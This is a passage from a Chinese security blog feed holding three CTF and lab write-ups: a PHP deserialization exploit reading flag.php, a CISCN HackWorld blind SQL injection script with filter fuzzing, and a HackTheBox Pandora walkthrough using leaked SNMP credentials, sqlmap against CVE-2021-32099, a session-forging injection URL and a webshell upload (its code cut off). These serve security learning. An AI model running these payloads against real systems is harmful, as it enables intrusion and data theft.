        <content type="html"><![CDATA[<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>通过查看源代码，如果想要获得flag，我们需要做以下几件事：</p><ol><li>更改<code>protected</code>变量的值</li><li>调用read成员函数读取文件</li><li>修改读取文件为flag文件</li><li>绕过<code>__destruct</code>魔术方法</li><li>绕过<code>is_valid</code>方法</li></ol><p>序列化的大致原理是将类中的属性转换为字符串，方便在web上进行传输，更详细的介绍可以参考这个<a href="https://www.cnblogs.com/youyoui/p/8610068.html">链接</a>。<br>protected属性在序列化时会出现阶段字符，也就是ASCII码中值为0的字符。但是<code>is_valid</code>方法只允许[32,125]范围内的字符，所以我们需要对其进行绕过。<br><code>string(121) &quot;O:11:\&quot;FileHandler\&quot;:3:&#123;s:5:\&quot;\0*\0op\&quot;;i:2;s:11:\&quot;\0*\0filename\&quot;;s:8:\&quot;flag.php\&quot;;s:10:\&quot;\0*\0content\&quot;;s:5:\&quot;hello\&quot;;&#125;&quot;</code>其中<code>\0</code>则为截断字符，正常输出是不会在窗口中显示出来的，需要进行转义。<br>可以采用如下两种方法进行绕过：</p><ul><li>PHP7.1+版本对属性类型不敏感，所以可以使用不存在特殊字符的public属性进行序列化，private属性同样存在截断字符。三者区别可以参考这个<a href="https://blog.csdn.net/Xxy605/article/details/117336343">链接</a>。</li><li>将小写的s类型变为大写的S，表示可以在字符串中用十六进制格式表示字符。我们便可以将截断字符表示为<code>\00</code>，需要注意的是字符串长度不变，也就是这三个字符代表一个截断字符。</li></ul><p>上面我们可以对属性进行赋值了，接下来要做的是绕过__destruct。__destruct中为强类型比较，也就是在比较数值前会先比较数据类型，如果数据类型不相等则为false。但是在<code>process</code>方法中为弱类型比较，如果等号两边数据类型不同，则会进行数据类型的转换，字符串类型的数据会转换为整数型的数据。<br>但这个规则在<code>PHP8.0</code>中发生了变化，详细的请看这个<a href="https://blog.csdn.net/wsfgrdgh/article/details/113986125">链接</a>。<br>这样我们可以将op变量赋值为整数型数值2，这样便不会进入__destruct的条件中。</p><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$op</span> = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$filename</span> = <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$content</span> = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$c</span> = <span class="keyword">new</span> FileHandler();</span><br><span class="line">    <span class="keyword">echo</span>(serialize(<span class="variable">$c</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:5:&quot;Hello&quot;;&#125;</code><br>使用上面的exp后，可以在网页的源代码中找到flag，因为输出的内容为php代码，所以浏览器不会显示在页面中。如果想要显示在页面中，可以使用php伪协议进行base64编码后输出。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$op</span> = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$filename</span> = <span class="string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$content</span> = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$c</span> = <span class="keyword">new</span> FileHandler();</span><br><span class="line">    <span class="keyword">echo</span>(serialize(<span class="variable">$c</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> web </category>
          
          <category> 小比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php反序列化 </tag>
            
            <tag> php伪协议 </tag>
            
            <tag> php强类型比较 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN-HackWorld</title>
      <link href="/2022/02/08/World/"/>
      <url>/2022/02/08/World/</url>
      
        <content type="html"><![CDATA[<h1 id="题目审计"><a href="#题目审计" class="headerlink" title="题目审计"></a>题目审计</h1><p><img src="https://s2.loli.net/2022/02/09/dOTQpmVL1o6G8SX.png" alt="image.png"><br>题目告诉我们答案在<strong>flag表</strong>中的<strong>flag列</strong>，接下来我们要做的就是看看过滤了哪些字符，然后想办法获取数据。</p><h1 id="过滤的字符"><a href="#过滤的字符" class="headerlink" title="过滤的字符"></a>过滤的字符</h1><p>可以直接使用burpsuite来进行fuzz，这里作者采用编写python脚本来进行fuzz。</p><div class="hide-toggle" ><div class="hide-button toggle-title" style=""><i class="fas fa-caret-right fa-fw"></i><span>fuzz脚本</span></div>    <div class="hide-content"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pickle <span class="keyword">import</span> NONE</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">payload_list = []</span><br><span class="line">valid_payload = []</span><br><span class="line">url = <span class="string">&quot;http://2cbe5bdd-ba44-4105-9f29-00d6712a52d0.node4.buuoj.cn:81/index.php&quot;</span></span><br><span class="line">dict_file = <span class="string">&quot;C:\\Users\\stw\\Desktop\\dict.txt&quot;</span></span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(dict_file)</span><br><span class="line">payload_list  =f.readlines()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(payload_list)):</span><br><span class="line">    payload_list[i] = payload_list[i][:-<span class="number">1</span>] <span class="comment"># 去掉每个字符串结尾的换行符</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> payload <span class="keyword">in</span> payload_list:</span><br><span class="line">    r = requests.post(url=url, data=&#123;<span class="string">&#x27;id&#x27;</span>: payload&#125;)</span><br><span class="line">    res = re.search(<span class="string">&#x27;SQL Injection Checked.&#x27;</span>, r.text)</span><br><span class="line">    <span class="keyword">if</span> res <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        valid_payload.append(payload)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(valid_payload)</span><br></pre></td></tr></table></figure></div></div><div class="hide-toggle" ><div class="hide-button toggle-title" style=""><i class="fas fa-caret-right fa-fw"></i><span>未过滤的字符</span></div>    <div class="hide-content"><p>[‘+’, ‘likeLiKe’, ‘sleepSLEEp’, ‘databaseDATABASe’, ‘delete’, ‘having’, ‘oroR’, ‘asAs’, ‘-~’, ‘BENCHMARK’, ‘limitLimIt’, ‘leftLeft’, ‘selectSELECT’, ‘insertinsERTINSERT’, ‘right’, ‘#’, ‘–’, ‘;’, ‘!’, ‘%’, ‘+’, ‘&lt;&gt;’, ‘(‘, ‘&gt;’, ‘&lt;’, ‘)’, ‘.’, ‘^’, ‘=’, ‘ANDANd’, ‘BYBy’, ‘CAST’, ‘COLUMNCOlumn’, ‘COUNTCount’, ‘CREATE’, ‘END’, ‘case’, “‘1’=’1”, ‘when’, “admin’”, ‘“‘, ‘+’, ‘REVERSE’, ‘’, ‘asciiASSICASSic’, ‘database’, ‘left’, ‘right’, ‘unionUNIonUNION’, ‘“‘, ‘&amp;’, ‘&amp;&amp;’, ‘||’, ‘/‘,<br>‘//‘, ‘<em>/</em>‘, ‘GROUP’, ‘HAVING’, ‘IF’, ‘INTO’, ‘JOIN’, ‘LEAVE’, ‘LEFT’, ‘LEVEL’, ‘sleep’, ‘LIKE’, ‘NAMES’, ‘NEXT’, ‘NULL’, ‘OF’, ‘ON’, ‘|’, ‘infromation_schema’, ‘user’, ‘OR’, ‘ORDER’, ‘ORD’, ‘SCHEMA’, ‘SELECT’, ‘SET’, ‘TABLE’, ‘THEN’, ‘UNION’, ‘UPDATE’, ‘USER’, ‘USING’, ‘VALUE’, ‘VALUES’, ‘WHEN’, ‘WHERE’, ‘ADD’, ‘AND’, ‘prepare’, ‘set’, ‘update’, ‘delete’, ‘drop’, ‘inset’, ‘CAST’, ‘COLUMN’, ‘CONCAT’, ‘GROUP_CONCAT’, ‘group_concat’, ‘CREATE’, ‘DATABASE’, ‘DATABASES’, ‘alter’,<br>‘DELETE’, ‘DROP’, ‘TABLE_SCHEMA’, ‘%df’, ‘concat_ws()’, ‘concat’, ‘LIMIT’, ‘ORD’, ‘ON’, ‘extractvalue’, ‘CAST()’, ‘by’,<br>‘ORDER’, ‘OUTFILE’, ‘RENAME’, ‘REPLACE’, ‘SCHEMA’, ‘SELECT’, ‘SET’, ‘updatexml’, ‘SHOW’, ‘SQL’, ‘TABLE’, ‘THEN’, ‘TRUE’, ‘instr’, ‘benchmark’, ‘bin’, ‘substring’, ‘ord’, ‘’, ‘UPDATE’, ‘VALUES’, ‘VARCHAR’, ‘VERSION’, ‘WHEN’, ‘WHERE’, ‘`’, ‘<br> ‘, ‘,’, ‘users’, ‘%0a%0A’, ‘%0b’, ‘mid’, ‘REGEXP’, ‘RLIKE’, ‘in’, ‘sys.schema_table_statistics_with_buffer’, ‘INFILE’,<br>‘count’, ‘%0c’, ‘from’, ‘%0d’, ‘%a0’, ‘=’, ‘@’, ‘else%27%23%22%2’]</p></div></div><h1 id="进行绕过"><a href="#进行绕过" class="headerlink" title="进行绕过"></a>进行绕过</h1><h2 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h2><p>SQL注入中如果禁用了空格，那么可以使用如下两种方法进行绕过：</p><ol><li><code>/**/</code>注释符绕过</li><li><code>()</code>括号子查询绕过<br>由于注释符被过滤，所以只能采用括号进行绕过。<br>在mysql中括号一般用来包围子查询或者查询条件，可是括号的作用不止这些，只要是返回结果的语句都可以用括号围起来，并且不需要空格来与其他部分分隔开。<br><img src="https://s2.loli.net/2022/02/09/dYDXMFHgoAUBvkb.png" alt="image.png"></li></ol><h2 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h2><p>当输入<code>1</code>时会返回<code>Hello, glzjin wants a girlfriend.</code> 输入其他的值则不会返回，并且不会返回详细的错误信息。<br>那么就可以知道这基本上就是一个布尔盲注了。在我们进行一个一个的字符比较时，如果相等则会返回1,否则返回0，利用这一点编写脚本。<br>其次该程序没有过滤掉<code>ascii</code>和<code>mid</code>函数，我们就可以利用这两个函数来进行比较。<br>整体思路如下所示：</p><ul><li>布尔盲注，按顺序的进行字符比较</li><li>服务器返回<code>Hello, glzjin wants a girlfriend.</code>则证明字符相等。</li></ul><div class="hide-toggle" ><div class="hide-button toggle-title" style=""><i class="fas fa-caret-right fa-fw"></i><span>exp</span></div>    <div class="hide-content"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pickle <span class="keyword">import</span> NONE</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">timeBasedBlindInject</span>(<span class="params">url</span>):</span></span><br><span class="line">    sql_dict = string.printable</span><br><span class="line">    res = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">80</span>):</span><br><span class="line">        <span class="keyword">for</span> ascii_string <span class="keyword">in</span> sql_dict:</span><br><span class="line">            data = <span class="string">f&#x27;(select(ascii(mid(flag,<span class="subst">&#123;pos&#125;</span>,1))=<span class="subst">&#123;<span class="built_in">ord</span>(ascii_string)&#125;</span>)from(flag))&#x27;</span></span><br><span class="line">            data = &#123;<span class="string">&quot;id&quot;</span>: data&#125;</span><br><span class="line">            r = requests.post(url=url, data=data)</span><br><span class="line">            <span class="keyword">if</span> re.search(<span class="string">&quot;Hello, glzjin wants a girlfriend.&quot;</span>, r.text):</span><br><span class="line">                res = res + ascii_string</span><br><span class="line">                <span class="built_in">print</span>(res)</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://15314337-d129-4e59-a6c1-81088d3c5c92.node4.buuoj.cn:81/index.php&quot;</span></span><br><span class="line">timeBasedBlindInject(url)</span><br></pre></td></tr></table></figure></div></div><p>最后查看程序输出即可得到flag。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> web </category>
          
          <category> ciscn </category>
          
          <category> 2019 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ciscn2019 </tag>
            
            <tag> sql盲注 </tag>
            
            <tag> fuzz </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB-Pandora</title>
      <link href="/2022/01/29/HTB-Pandora/"/>
      <url>/2022/01/29/HTB-Pandora/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>利用靶场来练习，可以很好的考验自己所学知识。此次玩的是<a href="https://www.hackthebox.com/">hackthebox</a>上面的Pandora盒子，与我之前打过的几个靶机有些共同的特点，考验了CVE利用能力，总的来说还是学到了不少东西。<br>过程概览：</p><ul><li>TCP扫描无果改为UDP扫描发现SNMP服务</li><li>扫描SNMP泄露的信息发现账号和密码</li><li>登录后发现有个内部的服务，通过端口转发，发现是Pandora FMS系统</li><li>查询Pandora的历史漏洞，发现存在SQL注入</li><li>利用SQL注入登录管理后台</li><li>后台上传shell得到普通flag</li><li>查看特权文件发现/usr/bin/pandora_backup存在环境变量注入，利用获取root shell<h1 id="信息发现"><a href="#信息发现" class="headerlink" title="信息发现"></a>信息发现</h1>TCP扫描发现开启了80和22端口。<br><img src="https://s2.loli.net/2022/01/29/qSZ6NK7M543bQWO.png" alt="image.png"><br>目录扫描发现存在目录遍历，但是没有什么特殊的文件，都是一些静态文件。<br><code>nmap -sC -sV -sU 10.10.11.136</code>进行UDP端口扫描。端口的服务是分TCP和UDP的，当时没有想到这个点。<br><img src="https://s2.loli.net/2022/01/29/SfWvxEntolBzrme.png" alt="image.png"><br>发现开启了SNMP服务，通过工具来扫描支持SNMP协议其他设备的一些信息，来看看存不存在敏感的信息。<br><code>snmpwalk -v 2c -c public 10.10.11.136 &gt; snmp.txt</code>扫描设备的一些信息。<br><img src="https://s2.loli.net/2022/01/29/9W7tqbUZYkBgjFA.png" alt="image.png"><br>发现存在用户名<mark class="hl-label blue">daniel</mark> 密码<mark class="hl-label blue">HotelBabylon23</mark> <br>登录后使用<code>netstat -antl</code>查看开放的端口，发现本地80端口开放了服务。<br><code>sudo ssh -L 80:127.0.0.1:80 daniel@10.10.11.136</code>在本地主机上输入命令，将本地的80端口映射到远程主机本地的80端口上，访问<code>http://127.0.0.1:80</code>发现是Pandora FMS服务。<h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><h2 id="普通用户"><a href="#普通用户" class="headerlink" title="普通用户"></a>普通用户</h2>首页显示的Pandora FMS版本为7.0NG.742_FIX_PERL2020存在<a href="https://www.cve.org/CVERecord?id=CVE-2021-32099">SQL注入漏洞</a>。<h3 id="漏洞解释"><a href="#漏洞解释" class="headerlink" title="漏洞解释"></a>漏洞解释</h3><div class="hide-toggle" ><div class="hide-button toggle-title" style=""><i class="fas fa-caret-right fa-fw"></i><span>/include/chart_generator.php</span></div>    <div class="hide-content"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">71</span>  <span class="comment">// Try to initialize session using existing php session id.</span></span><br><span class="line"><span class="number">72</span>  <span class="variable">$user</span> = <span class="keyword">new</span> PandoraFMS\User([<span class="string">&#x27;phpsessionid&#x27;</span> =&gt; <span class="variable">$_REQUEST</span>[<span class="string">&#x27;session_id&#x27;</span>]]);</span><br><span class="line"><span class="number">73</span>  <span class="keyword">if</span> (check_login(<span class="literal">false</span>) === <span class="literal">false</span>) &#123;   </span><br><span class="line"><span class="number">74</span>     <span class="comment">// Error handler.</span></span><br><span class="line"> ⋮</span><br><span class="line"><span class="number">96</span>  &#125;</span><br><span class="line"><span class="number">97</span></span><br><span class="line"><span class="number">98</span>  <span class="comment">// Access granted.</span></span><br></pre></td></tr></table></figure></div></div><div class="hide-toggle" ><div class="hide-button toggle-title" style=""><i class="fas fa-caret-right fa-fw"></i><span>/include/lib/User.php</span></div>    <div class="hide-content"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">60</span>  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">61  </span>&#123;</span><br><span class="line"> ⋮</span><br><span class="line"><span class="number">68</span>     <span class="keyword">if</span> (is_array(<span class="variable">$data</span>) === <span class="literal">true</span>) &#123;</span><br><span class="line"><span class="number">69</span>        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$data</span>[<span class="string">&#x27;phpsessionid&#x27;</span>]) === <span class="literal">true</span>) &#123;</span><br><span class="line"><span class="number">70</span>           <span class="keyword">$this</span>-&gt;sessions[<span class="variable">$data</span>[<span class="string">&#x27;phpsessionid&#x27;</span>]] = <span class="number">1</span>;</span><br><span class="line"><span class="number">71</span>           <span class="variable">$info</span> = \db_get_row_filter(</span><br><span class="line"><span class="number">72</span>              <span class="string">&#x27;tsessions_php&#x27;</span>,</span><br><span class="line"><span class="number">73</span>              [<span class="string">&#x27;id_session&#x27;</span> =&gt; <span class="variable">$data</span>[<span class="string">&#x27;phpsessionid&#x27;</span>]]</span><br><span class="line"><span class="number">74</span>          );</span><br><span class="line"><span class="number">75</span></span><br><span class="line"><span class="number">76</span>         <span class="keyword">if</span> (<span class="variable">$info</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line"><span class="number">77</span>            <span class="comment">// Process.</span></span><br><span class="line"><span class="number">78</span>            <span class="variable">$session_data</span> = session_decode(<span class="variable">$info</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line"><span class="number">79</span>            <span class="keyword">$this</span>-&gt;idUser = <span class="variable">$_SESSION</span>[<span class="string">&#x27;id_usuario&#x27;</span>];</span><br><span class="line"><span class="number">80</span></span><br><span class="line"><span class="number">81</span>            <span class="comment">// Valid session.</span></span><br><span class="line"><span class="number">82</span>            <span class="keyword">return</span> <span class="keyword">$this</span>;</span><br><span class="line"><span class="number">83</span>         &#125;</span><br></pre></td></tr></table></figure></div></div><code>chart_generator.php</code>用从客户端收到的<em>session_id</em>来初始化User对象，并且验证是在<code>User.php</code>中进行的。验证的过程大致如下所示：<div class="mermaid-wrap"><pre class="mermaid-src" hidden>  graph TD    A[phpsessionid] --&gt;|tsessions_php表| B(查询满足条件的数据)    B --&gt; C(解码序列化的session数据)    C--&gt; |填充到| D[$_SESSION全局变量]    D --&gt; E(验证session)  </pre></div>先调用了<code>db_get_row_filter</code>以传进来的<em>session_id</em>为条件获取数据，之后调用<code>session_decode()</code>查询，利用返回的<code>data</code>列进行session的反序列化，然后填充到<code>SESSION</code>中，最后进行身份的验证。此处由于没有对用户的输入进行很好的过滤，导致了SQL注入漏洞，具体原因可以查看此<a href="https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained">链接</a>。<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3>由漏洞解析阶段可知最后的身份验证是根据data列来进行的，所以我们需要将data列设置为具有较高权限用户的序列化session。<br><code>sqlmap -u http://127.0.0.1/pandora_console/include/chart_generator.php?session_id= --dbms=mysql --current-db</code>：获取到当前数据库名为<em>pandora</em>。<br><code>sqlmap -u http://127.0.0.1/pandora_console/include/chart_generator.php?session_id= --dbms=mysql -D pandora --tables</code>：获取<em>pandora</em>数据库里面的所有表名。<div class="hide-toggle" ><div class="hide-button toggle-title" style=""><i class="fas fa-caret-right fa-fw"></i><span>表名</span></div>    <div class="hide-content"><p>Database: pandora<br>[178 tables]<br>+————————————+<br>| taddress                           |<br>| taddress_agent                     |<br>| tagent_access                      |<br>| tagent_custom_data                 |<br>| tagent_custom_fields               |<br>| tagent_custom_fields_filter        |<br>| tagent_module_inventory            |<br>| tagent_module_log                  |<br>| tagent_repository                  |<br>| tagent_secondary_group             |<br>| tagente                            |<br>| tagente_datos                      |<br>| tagente_datos_inc                  |<br>| tagente_datos_inventory            |<br>| tagente_datos_log4x                |<br>| tagente_datos_string               |<br>| tagente_estado                     |<br>| tagente_modulo                     |<br>| talert_actions                     |<br>| talert_commands                    |<br>| talert_snmp                        |<br>| talert_snmp_action                 |<br>| talert_special_days                |<br>| talert_template_module_actions     |<br>| talert_template_modules            |<br>| talert_templates                   |<br>| tattachment                        |<br>| tautoconfig                        |<br>| tautoconfig_actions                |<br>| tautoconfig_rules                  |<br>| tcategory                          |<br>| tcluster                           |<br>| tcluster_agent                     |<br>| tcluster_item                      |<br>| tcollection                        |<br>| tconfig                            |<br>| tconfig_os                         |<br>| tcontainer                         |<br>| tcontainer_item                    |<br>| tcredential_store                  |<br>| tdashboard                         |<br>| tdatabase                          |<br>| tdeployment_hosts                  |<br>| tevent_alert                       |<br>| tevent_alert_action                |<br>| tevent_custom_field                |<br>| tevent_extended                    |<br>| tevent_filter                      |<br>| tevent_response                    |<br>| tevent_rule                        |<br>| tevento                            |<br>| textension_translate_string        |<br>| tfiles_repo                        |<br>| tfiles_repo_group                  |<br>| tgis_data_history                  |<br>| tgis_data_status                   |<br>| tgis_map                           |<br>| tgis_map_connection                |<br>| tgis_map_has_tgis_map_con          |<br>| tgis_map_layer                     |<br>| tgis_map_layer_groups              |<br>| tgis_map_layer_has_tagente         |<br>| tgraph                             |<br>| tgraph_source                      |<br>| tgraph_source_template             |<br>| tgraph_template                    |<br>| tgroup_stat                        |<br>| tgrupo                             |<br>| tincidencia                        |<br>| titem                              |<br>| tlanguage                          |<br>| tlayout                            |<br>| tlayout_data                       |<br>| tlayout_template                   |<br>| tlayout_template_data              |<br>| tlink                              |<br>| tlocal_component                   |<br>| tlog_graph_models                  |<br>| tmap                               |<br>| tmensajes                          |<br>| tmetaconsole_agent                 |<br>| tmetaconsole_agent_secondary_group |<br>| tmetaconsole_event                 |<br>| tmetaconsole_event_history         |<br>| tmetaconsole_setup                 |<br>| tmigration_module_queue            |<br>| tmigration_queue                   |<br>| tmodule                            |<br>| tmodule_group                      |<br>| tmodule_inventory                  |<br>| tmodule_relationship               |<br>| tmodule_synth                      |<br>| tnetflow_filter                    |<br>| tnetflow_report                    |<br>| tnetflow_report_content            |<br>| tnetwork_component                 |<br>| tnetwork_component_group           |<br>| tnetwork_map                       |<br>| tnetwork_matrix                    |<br>| tnetwork_profile                   |<br>| tnetwork_profile_component         |<br>| tnetworkmap_ent_rel_nodes          |<br>| tnetworkmap_enterprise             |<br>| tnetworkmap_enterprise_nodes       |<br>| tnews                              |<br>| tnota                              |<br>| tnotification_group                |<br>| tnotification_source               |<br>| tnotification_source_group         |<br>| tnotification_source_group_user    |<br>| tnotification_source_user          |<br>| tnotification_user                 |<br>| torigen                            |<br>| tpassword_history                  |<br>| tperfil                            |<br>| tphase                             |<br>| tplanned_downtime                  |<br>| tplanned_downtime_agents           |<br>| tplanned_downtime_modules          |<br>| tplugin                            |<br>| tpolicies                          |<br>| tpolicy_agents                     |<br>| tpolicy_alerts                     |<br>| tpolicy_alerts_actions             |<br>| tpolicy_collections                |<br>| tpolicy_groups                     |<br>| tpolicy_modules                    |<br>| tpolicy_modules_inventory          |<br>| tpolicy_plugins                    |<br>| tpolicy_queue                      |<br>| tprofile_view                      |<br>| tprovisioning                      |<br>| tprovisioning_rules                |<br>| trecon_script                      |<br>| trecon_task                        |<br>| trel_item                          |<br>| tremote_command                    |<br>| tremote_command_target             |<br>| treport                            |<br>| treport_content                    |<br>| treport_content_item               |<br>| treport_content_item_temp          |<br>| treport_content_sla_com_temp       |<br>| treport_content_sla_combined       |<br>| treport_content_template           |<br>| treport_custom_sql                 |<br>| treport_template                   |<br>| treset_pass                        |<br>| treset_pass_history                |<br>| tserver                            |<br>| tserver_export                     |<br>| tserver_export_data                |<br>| tservice                           |<br>| tservice_element                   |<br>| tsesion                            |<br>| tsesion_extended                   |<br>| tsessions_php                      |<br>| tskin                              |<br>| tsnmp_filter                       |<br>| ttag                               |<br>| ttag_module                        |<br>| ttag_policy_module                 |<br>| ttipo_modulo                       |<br>| ttransaction                       |<br>| ttrap                              |<br>| ttrap_custom_values                |<br>| tupdate                            |<br>| tupdate_journal                    |<br>| tupdate_package                    |<br>| tupdate_settings                   |<br>| tuser_double_auth                  |<br>| tuser_task                         |<br>| tuser_task_scheduled               |<br>| tusuario                           |<br>| tusuario_perfil                    |<br>| tvisual_console_elements_cache     |<br>| twidget                            |<br>| twidget_dashboard                  |<br>+————————————+</p></div></div>由于原代码中是从<code>tsessions_php</code>表中获取数据的，所以我们查看该表的数据，<code>sqlmap -u http://127.0.0.1/pandora_console/include/chart_generator.php?session_id= --dbms=mysql -D pandora -T tsessions_php -C data,id_session --dump </code>，发现存在admin的session序列化数据。<br><img src="https://s2.loli.net/2022/01/31/LCqOIgdopsMNhQX.png" alt="image.png"><br>之后可以利用SQL注入来为<em>data</em>列赋值，<code>http://127.0.0.1/pandora_console/include/chart_generator.php?session_id=%27union%20select%201,2,%27id_usuario|s:5:%22admin%22;%27%20as%20data--+</code>。<br>之后重新访问控制台界面，我们就会以admin的身份进入到后台。<br><img src="https://s2.loli.net/2022/01/31/wzYFbrCJ2Rne1c5.png" alt="image.png"><br>上传文件的地点：<br><img src="https://s2.loli.net/2022/01/31/R6wLDGl4PoB2Fyv.png" alt="image.png"><br>之后通过访问界面logo知道可以通过<code>http://127.0.0.1/pandora_console/images/</code>访问到上传的文件，所以可以在此点上传php webshell。<div class="hide-toggle" ><div class="hide-button toggle-title" style=""><i class="fas fa-caret-right fa-fw"></i><span>php_shell</span></div>    <div class="hide-content"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span 